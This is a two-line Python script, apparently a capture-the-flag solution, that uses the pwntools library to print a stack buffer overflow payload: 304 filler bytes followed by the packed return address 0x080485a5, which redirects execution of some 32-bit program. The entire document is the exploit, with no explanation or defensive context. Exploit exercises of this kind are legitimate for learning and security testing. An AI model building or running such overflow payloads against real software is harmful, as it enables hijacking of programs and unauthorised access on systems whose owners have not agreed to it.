from pwn import *

print 'a'*304 + p32(0x080485a5)
